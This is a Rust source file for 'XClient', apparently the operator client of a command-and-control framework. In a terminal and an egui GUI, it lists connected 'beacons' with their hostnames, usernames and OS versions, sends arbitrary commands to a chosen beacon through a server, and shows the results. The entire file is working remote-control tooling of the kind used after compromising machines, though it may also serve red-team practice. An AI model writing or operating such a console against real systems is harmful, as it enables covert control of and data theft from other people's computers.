use colored::*;
use eframe::egui;
use egui::mutex::Mutex as EguiMutex;
use egui::{Color32, Pos2, Rect, Shape, Stroke, Vec2};
use egui_extras::{Column, TableBuilder};
use reqwest::blocking::Client as ReqwestClient;
use rustyline::error::ReadlineError;
use rustyline::{DefaultEditor, Result};
use std::path::PathBuf;
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::Duration;

struct Client {
    editor: DefaultEditor,
    history_path: PathBuf,
    server_url: String,
}

#[derive(serde::Deserialize, Debug, Clone)]
struct Beacon {
    id: String,
    last_seen: String,
    status: String,
    hostname: Option<String>,
    username: Option<String>,
    os_version: Option<String>,
}

#[derive(Debug, serde::Serialize, serde::Deserialize)]
struct Command {
    id: i64,
    beacon_id: String,
    command: String,
    status: String,
    created_at: String,
    result: Option<String>,
    completed_at: Option<String>,
}

#[derive(Debug, serde::Serialize)]
struct NewCommand {
    beacon_id: String,
    command: String,
}

impl Client {
    fn new() -> Result<Self> {
        let mut editor = DefaultEditor::new()?;
        let history_path = dirs::home_dir()
            .unwrap_or_default()
            .join(".xclient_history");

        // Load history if it exists
        if editor.load_history(&history_path).is_err() {
            println!("{}", "No previous history.".yellow());
        }

        Ok(Self {
            editor,
            history_path,
            server_url: String::from("http://127.0.0.1:4444"),
        })
    }

    fn print_help(&self) {
        println!("\n{}", "Available Commands:".green().bold());
        println!("  {} - Send ping to server", "ping".cyan());
        println!("  {} - List active beacons", "beacons".cyan());
        println!(
            "  {} - Send command to beacon",
            "run <beacon_id> <command>".cyan()
        );
        println!(
            "  {} - List commands for beacon",
            "commands <beacon_id>".cyan()
        );
        println!("  {} - Show this help message", "help".cyan());
        println!("  {} - Clear the screen", "clear".cyan());
        println!("  {} - Exit the client", "exit".cyan());
        println!();
    }

    fn handle_command(&self, command: &str) -> bool {
        let parts: Vec<&str> = command.trim().split_whitespace().collect();
        match parts.get(0).map(|s| *s) {
            Some("exit") | Some("quit") => {
                println!("{}", "Goodbye!".green());
                false
            }
            Some("help") => {
                self.print_help();
                true
            }
            Some("clear") => {
                print!("\x1B[2J\x1B[1;1H");
                true
            }
            Some("ping") => {
                self.send_ping();
                true
            }
            Some("beacons") => {
                self.list_beacons();
                true
            }
            Some("run") => {
                if parts.len() < 3 {
                    println!("{}", "Usage: run <beacon_id> <command>".red());
                } else {
                    let beacon_id = parts[1];
                    let command = parts[2..].join(" ");
                    self.send_command(beacon_id, &command);
                }
                true
            }
            Some("commands") => {
                if parts.len() != 2 {
                    println!("{}", "Usage: commands <beacon_id>".red());
                } else {
                    self.list_commands(parts[1]);
                }
                true
            }
            Some("") => true,
            Some(cmd) => {
                println!("{} {}", "Unknown command:".red(), cmd);
                true
            }
            None => true,
        }
    }

    fn send_command(&self, beacon_id: &str, command: &str) {
        let new_command = NewCommand {
            beacon_id: beacon_id.to_string(),
            command: command.to_string(),
        };

        match reqwest::blocking::Client::new()
            .post(format!("{}/command/new", self.server_url))
            .json(&new_command)
            .send()
        {
            Ok(response) => {
                if response.status().is_success() {
                    match response.json::<Command>() {
                        Ok(cmd) => {
                            println!(
                                "{} Command {} scheduled for beacon {}",
                                "Success:".green(),
                                cmd.id.to_string().yellow(),
                                cmd.beacon_id.cyan()
                            );
                        }
                        Err(e) => println!("{} {}", "Failed to parse response:".red(), e),
                    }
                } else {
                    println!(
                        "{} {} ({})",
                        "Server error:".red(),
                        response.status(),
                        response.status().as_str()
                    );
                }
            }
            Err(e) => println!("{} {}", "Failed to send command:".red(), e),
        }
    }

    fn list_commands(&self, beacon_id: &str) {
        match reqwest::blocking::get(format!("{}/command/list/{}", self.server_url, beacon_id)) {
            Ok(response) => {
                if response.status().is_success() {
                    match response.json::<Vec<Command>>() {
                        Ok(commands) => {
                            if commands.is_empty() {
                                println!(
                                    "\n{} No commands found for beacon {}",
                                    "Info:".blue(),
                                    beacon_id
                                );
                            } else {
                                println!(
                                    "\n{} for beacon {}:",
                                    "Commands".green().bold(),
                                    beacon_id.cyan()
                                );
                                println!("{:-<80}", "");
                                for cmd in commands {
                                    println!(
                                        "ID: {} | Status: {} | Created: {}",
                                        cmd.id.to_string().yellow(),
                                        cmd.status.green(),
                                        cmd.created_at.blue()
                                    );
                                    println!("Command: {}", cmd.command);
                                    if let Some(result) = cmd.result {
                                        println!("Result: {}", result.green());
                                    }
                                    if let Some(completed_at) = cmd.completed_at {
                                        println!("Completed: {}", completed_at.blue());
                                    }
                                    println!("{:-<80}", "");
                                }
                            }
                            println!();
                        }
                        Err(e) => println!("{} {}", "Failed to parse commands:".red(), e),
                    }
                } else {
                    println!(
                        "{} {} ({})",
                        "Server error:".red(),
                        response.status(),
                        response.status().as_str()
                    );
                }
            }
            Err(e) => println!("{} {}", "Failed to fetch commands:".red(), e),
        }
    }

    fn send_ping(&self) {
        match reqwest::blocking::Client::new()
            .post(&self.server_url)
            .body(format!("PING client"))
            .send()
        {
            Ok(response) => {
                if response.status().is_success() {
                    match response.text() {
                        Ok(text) => println!("{} {}", "Server response:".green(), text),
                        Err(e) => println!("{} {}", "Failed to read response:".red(), e),
                    }
                } else {
                    println!(
                        "{} {} ({})",
                        "Server error:".red(),
                        response.status(),
                        response.status().as_str()
                    );
                }
            }
            Err(e) => println!("{} {}", "Failed to send request:".red(), e),
        }
    }

    fn run(&mut self) -> Result<()> {
        println!("{}", "\nWelcome to XClient!".green().bold());
        self.print_help();

        loop {
            let prompt = format!("{} ", ">>".cyan().bold());
            match self.editor.readline(&prompt) {
                Ok(line) => {
                    self.editor.add_history_entry(line.as_str())?;
                    if !self.handle_command(&line) {
                        break;
                    }
                }
                Err(ReadlineError::Interrupted) => {
                    println!("{}", "CTRL-C".yellow());
                    break;
                }
                Err(ReadlineError::Eof) => {
                    println!("{}", "CTRL-D".yellow());
                    break;
                }
                Err(err) => {
                    println!("{} {:?}", "Error:".red(), err);
                    break;
                }
            }
        }

        // Save history
        if let Err(e) = self.editor.save_history(&self.history_path) {
            println!("{} {}", "Failed to save history:".red(), e);
        }

        Ok(())
    }

    fn list_beacons(&self) {
        match reqwest::blocking::get(format!("{}/beacons", self.server_url)) {
            Ok(response) => {
                if response.status().is_success() {
                    match response.json::<Vec<Beacon>>() {
                        Ok(beacons) => {
                            println!("\n{}", "Active Beacons:".green().bold());
                            println!("{:-<80}", "");
                            for beacon in beacons {
                                println!(
                                    "{}: {} ({})",
                                    beacon.id.cyan(),
                                    beacon.last_seen.yellow(),
                                    beacon.status.green()
                                );
                                if let Some(hostname) = beacon.hostname {
                                    println!("  Hostname: {}", hostname.blue());
                                }
                                if let Some(username) = beacon.username {
                                    println!("  User: {}", username.blue());
                                }
                                if let Some(os_version) = beacon.os_version {
                                    println!("  OS: {}", os_version.blue());
                                }
                                println!("{:-<80}", "");
                            }
                            println!();
                        }
                        Err(e) => println!("{} {}", "Failed to parse beacons:".red(), e),
                    }
                } else {
                    println!(
                        "{} {} ({})",
                        "Server error:".red(),
                        response.status(),
                        response.status().as_str()
                    );
                }
            }
            Err(e) => println!("{} {}", "Failed to fetch beacons:".red(), e),
        }
    }
}

#[derive(Debug, PartialEq)]
enum View {
    Dashboard,
    Beacons,
    Listeners,
    Settings,
}

struct GuiClient {
    beacons: Arc<Mutex<Vec<Beacon>>>,
    server_url: String,
    reqwest_client: ReqwestClient,
    selected_beacon: Option<String>,
    // Add new fields for command interface
    command_input: String,
    command_history: Vec<String>,
    show_command_panel: bool,
    command_output: Vec<String>,
    current_view: View,
}

impl GuiClient {
    fn new(cc: &eframe::CreationContext<'_>) -> Self {
        // Customize fonts if needed
        let fonts = egui::FontDefinitions::default();
        cc.egui_ctx.set_fonts(fonts);

        let client = Self {
            beacons: Arc::new(Mutex::new(Vec::new())),
            server_url: String::from("http://127.0.0.1:4444"),
            reqwest_client: ReqwestClient::new(),
            selected_beacon: None,
            command_input: String::new(),
            command_history: Vec::new(),
            show_command_panel: false,
            command_output: Vec::new(),
            current_view: View::Dashboard,
        };

        // Start beacon polling thread
        let beacons = client.beacons.clone();
        let server_url = client.server_url.clone();
        thread::spawn(move || {
            let poll_client = ReqwestClient::new();
            loop {
                if let Ok(response) = poll_client.get(format!("{}/beacons", server_url)).send() {
                    if response.status().is_success() {
                        if let Ok(new_beacons) = response.json::<Vec<Beacon>>() {
                            if let Ok(mut beacons_lock) = beacons.lock() {
                                *beacons_lock = new_beacons;
                            }
                        }
                    }
                }
                thread::sleep(Duration::from_secs(5));
            }
        });

        client
    }

    fn render_nav_button(&mut self, ui: &mut egui::Ui, icon: char, view: View, tooltip: &str) {
        let is_selected = self.current_view == view;

        let btn = egui::Button::new(egui::RichText::new(icon.to_string()).size(24.0).color(
            if is_selected {
                ui.visuals().selection.stroke.color
            } else {
                ui.visuals().text_color()
            },
        ))
        .min_size(egui::vec2(40.0, 40.0));

        let response = ui.add(btn);

        if response.clicked() {
            self.current_view = view;
        }

        response.on_hover_text(tooltip);
    }

    fn send_command(&mut self, beacon_id: &str) {
        let new_command = NewCommand {
            beacon_id: beacon_id.to_string(),
            command: self.command_input.clone(),
        };

        // Add command to history
        self.command_output
            .push(format!("> {}", self.command_input));

        // Send command using reqwest
        match self
            .reqwest_client
            .post(format!("{}/command/new", self.server_url))
            .json(&new_command)
            .send()
        {
            Ok(response) => match response.json::<Command>() {
                Ok(cmd) => {
                    self.command_output
                        .push(format!("Command scheduled (ID: {})", cmd.id));
                }
                Err(e) => {
                    self.command_output
                        .push(format!("Failed to parse response: {}", e));
                }
            },
            Err(e) => {
                self.command_output
                    .push(format!("Failed to send command: {}", e));
            }
        }

        self.command_input.clear();
    }

    fn render_beacons_table(&mut self, ui: &mut egui::Ui) {
        if let Ok(beacons) = self.beacons.lock() {
            if beacons.is_empty() {
                ui.vertical_centered(|ui| {
                    ui.add_space(20.0);
                    ui.label("⚠ No agents connected");
                    ui.add_space(10.0);
                });
                return;
            }

            let table = TableBuilder::new(ui)
                .striped(true)
                .resizable(true)
                .cell_layout(egui::Layout::left_to_right(egui::Align::Center))
                .column(Column::auto().at_least(100.0).resizable(true)) // ID
                .column(Column::auto().at_least(80.0).resizable(true)) // Status
                .column(Column::auto().at_least(120.0).resizable(true)) // Hostname
                .column(Column::auto().at_least(100.0).resizable(true)) // Username
                .column(Column::auto().at_least(120.0).resizable(true)) // OS Version
                .column(Column::remainder().at_least(150.0)); // Last Seen

            table
                .header(20.0, |mut header| {
                    header.col(|ui| {
                        ui.strong("ID");
                    });
                    header.col(|ui| {
                        ui.strong("Status");
                    });
                    header.col(|ui| {
                        ui.strong("Hostname");
                    });
                    header.col(|ui| {
                        ui.strong("Username");
                    });
                    header.col(|ui| {
                        ui.strong("OS Version");
                    });
                    header.col(|ui| {
                        ui.strong("Last Seen");
                    });
                })
                .body(|mut body| {
                    let row_height = 30.0;
                    for beacon in beacons.iter() {
                        body.row(row_height, |mut row| {
                            let is_selected = self.selected_beacon.as_ref() == Some(&beacon.id);

                            row.col(|ui| {
                                let response = ui.selectable_label(is_selected, &beacon.id);
                                if response.clicked() {
                                    self.selected_beacon = Some(beacon.id.clone());
                                }
                                response.context_menu(|ui| {
                                    if ui.button("Interact").clicked() {
                                        self.selected_beacon = Some(beacon.id.clone());
                                        self.show_command_panel = true;
                                        ui.close_menu();
                                    }
                                });
                            });

                            row.col(|ui| {
                                ui.label(&beacon.status);
                            });
                            row.col(|ui| {
                                ui.label(beacon.hostname.as_deref().unwrap_or("N/A"));
                            });
                            row.col(|ui| {
                                ui.label(beacon.username.as_deref().unwrap_or("N/A"));
                            });
                            row.col(|ui| {
                                ui.label(beacon.os_version.as_deref().unwrap_or("N/A"));
                            });
                            row.col(|ui| {
                                ui.label(&beacon.last_seen);
                            });
                        });
                    }
                });
        }
    }

    fn render_command_history(&mut self, ui: &mut egui::Ui) {
        for output in &self.command_output {
            ui.label(output);
        }
    }

    fn render_command_results(&mut self, ui: &mut egui::Ui, beacon_id: &str) {
        if let Ok(commands) = self
            .reqwest_client
            .get(format!("{}/command/list/{}", self.server_url, beacon_id))
            .send()
        {
            if let Ok(commands) = commands.json::<Vec<Command>>() {
                for cmd in commands.iter().rev() {
                    ui.group(|ui| {
                        ui.horizontal(|ui| {
                            ui.label(format!("ID: {}", cmd.id));
                            ui.label(format!("Status: {}", cmd.status));
                            ui.label(format!("Created: {}", cmd.created_at));
                        });
                        ui.label(format!("Command: {}", cmd.command));
                        if let Some(result) = &cmd.result {
                            ui.separator();
                            ui.label("Output:");
                            ui.label(result);
                        }
                        if let Some(completed_at) = &cmd.completed_at {
                            ui.small(format!("Completed: {}", completed_at));
                        }
                    });
                    ui.add_space(4.0);
                }
            }
        }
    }

    fn render_beacons_view(&mut self, ui: &mut egui::Ui) {
        // Beacons table panel
        egui::TopBottomPanel::top("beacons")
            .resizable(true)
            .default_height(200.0)
            .min_height(100.0)
            .show_inside(ui, |ui| {
                egui::ScrollArea::vertical()
                    .id_salt("beacons_scroll")
                    .show(ui, |ui| {
                        self.render_beacons_table(ui);
                    });
            });

        // Command interface (when beacon is selected)
        if self.show_command_panel {
            if let Some(beacon_id) = &self.selected_beacon.clone() {
                egui::SidePanel::left("command_panel")
                    .resizable(true)
                    .min_width(300.0)
                    .default_width(400.0)
                    .show_inside(ui, |ui| {
                        ui.heading(format!("Interact: {}", beacon_id));

                        // Command history
                        egui::ScrollArea::vertical()
                            .id_salt("command_history")
                            .stick_to_bottom(true)
                            .show(ui, |ui| {
                                self.render_command_history(ui);
                            });

                        // Command input
                        ui.with_layout(egui::Layout::bottom_up(egui::Align::LEFT), |ui| {
                            ui.horizontal(|ui| {
                                let text_edit = ui.add_sized(
                                    ui.available_size() - egui::vec2(60.0, 0.0),
                                    egui::TextEdit::singleline(&mut self.command_input)
                                        .hint_text("Enter command...")
                                        .id_salt("command_input"),
                                );

                                if (text_edit.lost_focus()
                                    && ui.input(|i| i.key_pressed(egui::Key::Enter)))
                                    || ui.button("Send").clicked()
                                {
                                    if !self.command_input.is_empty() {
                                        self.send_command(beacon_id);
                                    }
                                }
                            });
                        });
                    });

                // Command results panel (central)
                egui::CentralPanel::default().show_inside(ui, |ui| {
                    ui.heading("Command Results");
                    egui::ScrollArea::vertical()
                        .id_salt("command_results")
                        .show(ui, |ui| {
                            self.render_command_results(ui, beacon_id);
                        });
                });
            }
        }
    }
}

impl eframe::App for GuiClient {
    fn update(&mut self, ctx: &egui::Context, _frame: &mut eframe::Frame) {
        // Add the left navigation panel
        egui::SidePanel::left("nav_panel")
            .max_width(50.0)
            .show(ctx, |ui| {
                ui.vertical_centered(|ui| {
                    ui.add_space(10.0);
                    self.render_nav_button(ui, '📊', View::Dashboard, "Dashboard");
                    self.render_nav_button(ui, '💻', View::Beacons, "Beacons");
                    self.render_nav_button(ui, '📡', View::Listeners, "Listeners");
                    ui.with_layout(egui::Layout::bottom_up(egui::Align::Center), |ui| {
                        self.render_nav_button(ui, '⚙', View::Settings, "Settings");
                    });
                });
            });

        // Main content area
        egui::CentralPanel::default().show(ctx, |ui| {
            match self.current_view {
                View::Dashboard => {
                    ui.heading("Dashboard");
                    // Add dashboard content
                }
                View::Beacons => {
                    self.render_beacons_view(ui);
                }
                View::Listeners => {
                    ui.heading("Listeners");
                    // Add listeners content
                }
                View::Settings => {
                    ui.heading("Settings");
                    // Add settings content
                }
            }
        });

        // Request repaint
        ctx.request_repaint_after(Duration::from_secs(1));
    }
}

fn main() -> eframe::Result<()> {
    // let mut client = Client::new()?;
    // client.run()
    //

    let native_options = eframe::NativeOptions {
        viewport: egui::ViewportBuilder::default().with_inner_size([800.0, 600.0]),
        ..Default::default()
    };

    eframe::run_native(
        "XClient",
        native_options,
        Box::new(|cc| Ok(Box::new(GuiClient::new(cc)))),
    )
}
